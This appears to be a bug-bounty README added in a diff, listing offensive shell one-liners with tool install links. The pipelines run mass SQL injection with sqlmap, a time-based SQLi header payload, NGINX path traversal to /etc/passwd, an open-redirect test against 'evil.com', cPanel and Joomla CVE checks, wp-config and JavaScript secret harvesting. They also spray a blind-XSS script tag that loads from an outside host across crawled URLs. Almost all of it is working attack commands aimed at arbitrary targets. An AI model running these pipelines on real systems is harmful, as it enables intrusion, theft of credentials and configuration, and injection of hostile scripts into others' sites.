@@ -1,0 +1,139 @@
+<h1 id="one-liner-collections">One-Liner-Collections</h1>
+<p>This Repositories contains list of One Liners with Descriptions and
+Installation requirements</p>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="sql-injection">SQL Injection</h1>
+<h2 id="installation-requirements">Installation Requirements</h2>
+<ol type="1">
+<li>Subfinder : https://github.com/projectdiscovery/subfinder</li>
+<li>GAU : https://github.com/lc/gau</li>
+<li>GF : https://github.com/tomnomnom/gf</li>
+<li>Findomain : https://github.com/Findomain/Findomain</li>
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+<li>Anew : https://github.com/tomnomnom/anew</li>
+<li>Waybackurls : https://github.com/tomnomnom/waybackurls</li>
+</ol>
+<h2 id="oneliner">OneLiner</h2>
+<pre><code>subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli &gt;gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt</code></pre>
+<pre><code>findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli &gt;&gt; sqli ; sqlmap -m sqli --batch --random-agent --level 1</code></pre>
+<pre><code>cat urls.txt | grep &quot;.php&quot; | sed &#39;s/\.php.*/.php\//&#39; | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent &quot;$url&quot; | grep -qs &quot;You have an error in your SQL syntax&quot; &amp;&amp; echo -e &quot;$url \e[1;32mSQLI by Cybertix\e[0m&quot; || echo -e &quot;$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m&quot; ;done
+</code></pre>
+<h3 id="header-based-blind-sql-injection">Header-Based Blind SQL
+injection</h3>
+<pre><code>cat domain.txt | httpx -silent -H &quot;X-Forwarded-For: &#39;XOR(if(now()=sysdate(),sleep(13),0))OR&quot; -rt -timeout 20 -mrt &#39;&gt;13&#39;</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="open-redirection">Open Redirection</h1>
+<h2 id="installation-requirements-1">Installation Requirements</h2>
+<ol type="1">
+<li>Waybackurls : https://github.com/tomnomnom/waybackurls</li>
+<li>Bhedak : https://github.com/R0X4R/bhedak</li>
+<li>GAU : https://github.com/lc/gau</li>
+<li>GF : https://github.com/tomnomnom/gf</li>
+<li>QS-Replace : https://github.com/tomnomnom/qsreplace</li>
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+<li>Subfinder : https://github.com/projectdiscovery/subfinder</li>
+<li>Httprobe : https://github.com/tomnomnom/httprobe</li>
+<li>Nuclei : https://github.com/projectdiscovery/nuclei</li>
+</ol>
+<h2 id="oneliner-1">OneLiner</h2>
+<pre><code>waybackurls TARGET.COM | grep -a -i \=http | qsreplace &#39;http://evil.com&#39; | while read host do;do curl -s -L $host -I| grep &quot;evil.com&quot; &amp;&amp; echo &quot;$host \033[0;31mVulnerable\n&quot; ;done</code></pre>
+<pre><code>subfinder -dL domains.txt | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep &quot;\?&quot; &gt; open.txt; nuclei -t Url-Redirection-Catcher.yaml -l open.txt</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="nginx-path-traversal">NGINX Path Traversal</h1>
+<h2 id="installation-requirements-2">Installation Requirements</h2>
+<ol type="1">
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+</ol>
+<h2 id="oneliner-2">OneLiner</h2>
+<pre><code>httpx -l url.txt -path &quot;///////../../../../../../etc/passwd&quot; -status-code -mc 200 -ms &#39;root:&#39;</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="subdomain-takeover">Subdomain Takeover</h1>
+<h2 id="installation-requirements-3">Installation Requirements</h2>
+<ol type="1">
+<li>Subfinder : https://github.com/projectdiscovery/subfinder</li>
+<li>Assetfinder : https://github.com/tomnomnom/assetfinder</li>
+<li>Amass : https://github.com/OWASP/Amass</li>
+<li>Subjack : https://github.com/haccer/subjack</li>
+</ol>
+<h2 id="oneliner-3">OneLiner</h2>
+<pre><code>subfinder -d HOST &gt;&gt; FILE; assetfinder --subs-only HOST &gt;&gt; FILE; amass enum -norecursive -noalts -d HOST &gt;&gt; FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 &gt;&gt; takeover ;</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="extract-urls-from-source-code">Extract URLs from Source
+Code</h1>
+<h2 id="oneliner-4">OneLiner</h2>
+<pre><code>curl &quot;https://TARGET.Com&quot; | grep -oP &#39;(https*.//|www\.)[^]*&#39;</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="xss-cross-site-scripting">XSS (Cross-Site Scripting)</h1>
+<h2 id="installation-requirements-4">Installation Requirements</h2>
+<ol type="1">
+<li>Katana : https://github.com/projectdiscovery/katana</li>
+<li>Dalfox : https://github.com/hahwul/dalfox</li>
+<li>Waybackurls : https://github.com/tomnomnom/waybackurls</li>
+<li>GF : https://github.com/tomnomnom/gf</li>
+<li>Dalfox : https://github.com/hahwul/dalfox</li>
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+</ol>
+<h2 id="oneliner-5">OneLiner</h2>
+<pre><code>echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav</code></pre>
+<pre><code>waybackurls http://testphp.vulnweb.com | gf xss | sed &#39;s/=.*/=/&#39; | sort -u | tee XSS.txt &amp;&amp; cat XSS.txt | dalfox -b http://chirag.bxss.in pipe &gt; output.txt</code></pre>
+<h3 id="blind-xss-mass-hunting">Blind XSS Mass Hunting</h3>
+<pre><code>cat domain.txt | waybackurls | httpx -H &quot;User-Agent: \&quot;&gt;&lt;script src=https://chirag.bxss.in&gt;&lt;/script&gt;&quot;</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="find-endpoints-in-js">Find Endpoints in JS</h1>
+<h2 id="installation-requirements-5">Installation Requirements</h2>
+<ol type="1">
+<li>Katana : https://github.com/projectdiscovery/katana</li>
+<li>Anew : https://github.com/tomnomnom/anew</li>
+</ol>
+<h2 id="oneliner-6">OneLiner</h2>
+<pre><code>katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1
+id="oneliner-for-cve-2023-23752---𝙅𝙤𝙤𝙢𝙡𝙖-𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧-𝘼𝙘𝙘𝙚𝙨𝙨-𝙘𝙝𝙚𝙘𝙠-𝙞𝙣-𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚-𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩">OneLiner
+for CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚
+𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩</h1>
+<h2 id="installation-requirements-6">Installation Requirements</h2>
+<ol type="1">
+<li>Subfinder : https://github.com/projectdiscovery/subfinder</li>
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+</ol>
+<h2 id="oneliner-7">OneLiner</h2>
+<pre><code>subfinder -d http://TARGET.COM -silent -all | httpx -silent -path &#39;api/index.php/v1/config/application?public=true&#39; -mc 200</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="cpanel-cve-2023-29489-xss-one-liner">cPanel CVE-2023-29489 XSS
+One-Liner</h1>
+<h2 id="installation-requirements-7">Installation Requirements</h2>
+<ol type="1">
+<li>Subfinder : https://github.com/projectdiscovery/subfinder</li>
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+</ol>
+<h2 id="oneliner-8">OneLiner</h2>
+<pre><code>subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path &#39;/cpanelwebcall/&lt;img%20src=x%20onerror=&quot;prompt(document.domain)&quot;&gt;aaaaaaaaaaaaaaa&#39; -mc 400</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="wp-config-oneliner">WP-Config Oneliner</h1>
+<h2 id="installation-requirements-8">Installation Requirements</h2>
+<ol type="1">
+<li>Subfinder : https://github.com/projectdiscovery/subfinder</li>
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+</ol>
+<h2 id="oneliner-9">OneLiner</h2>
+<pre><code>subfinder -silent -d TARGET.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path &quot;/wp-config.PHP&quot; -mc 200 -t 60 -status-code</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="js-secret-finder-oneliner">JS Secret Finder Oneliner</h1>
+<h2 id="installation-requirements-9">Installation Requirements</h2>
+<ol type="1">
+<li>Gau : https://github.com/lc/gau</li>
+<li>HTTPX : https://github.com/projectdiscovery/httpx</li>
+<li>Nuclei : https://github.com/projectdiscovery/nuclei</li>
+</ol>
+<h2 id="oneliner-10">OneLiner</h2>
+<pre><code>echo TARGET.com | gau | grep &quot;.js&quot; | httpx -content-type | grep &#39;application/javascript&#39; | awk &#39;{print $1}&#39; | nuclei -t /root/nuclei-templates/exposures/ -silent &gt; secrets.txt</code></pre>
+<p>────────────────────────────────────────────────────────────────────────</p>
+<h1 id="memory-dump-and-env-disclosure">Memory dump and env
+disclosure</h1>
+<h2 id="installation-requirements-10">Installation Requirements</h2>
+<ol type="1">
+<li>Shodan : https://www.shodan.io</li>
+</ol>
+<h2 id="oneliner-11">OneLiner</h2>
+<pre><code>shodan search org: &quot;Target&quot; http.favicon.hash:116323821 --fields ip_str,port--separator | awk &#39;{print $1 $2}&#39;</code></pre>
